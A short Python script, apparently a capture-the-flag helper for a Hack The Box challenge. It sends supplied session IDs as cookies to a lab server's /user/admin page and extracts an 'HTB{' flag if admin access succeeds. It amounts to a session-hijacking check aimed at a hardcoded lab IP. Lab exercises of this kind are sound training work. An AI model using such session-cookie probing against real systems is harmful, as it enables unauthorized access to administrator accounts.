import requests 
import sys

USERNAME = "noexist"
BASE_URL = "http://83.136.255.53:39663"

def check_flag(session_id):
    print(f"Checking session: {session_id}")
    resp = requests.get(f"{BASE_URL}/user/admin", cookies={"username":USERNAME, "session": session_id})

    if not resp.ok:
        # print("ERROR or Not Admin")
        return False

    if "HTB{" in resp.text:
        flag_start = resp.text.find("HTB{")
        flag_end = resp.text.find("}", flag_start)
        flag = resp.text[flag_start:flag_end+1]
        print(f"FLAG FOUND: {flag}") 
        return True
    return False

if __name__ == "__main__":
    if len(sys.argv) > 2:
        BASE_URL = sys.argv[1]
        print(f"[*] Target: {BASE_URL}")
        # Check specific session IDs passed as args
        for sid in sys.argv[2:]:
            if check_flag(sid):
                break
    else:
        print("Usage: python3 KO.py <URL> <session_id1> <session_id2> ...")
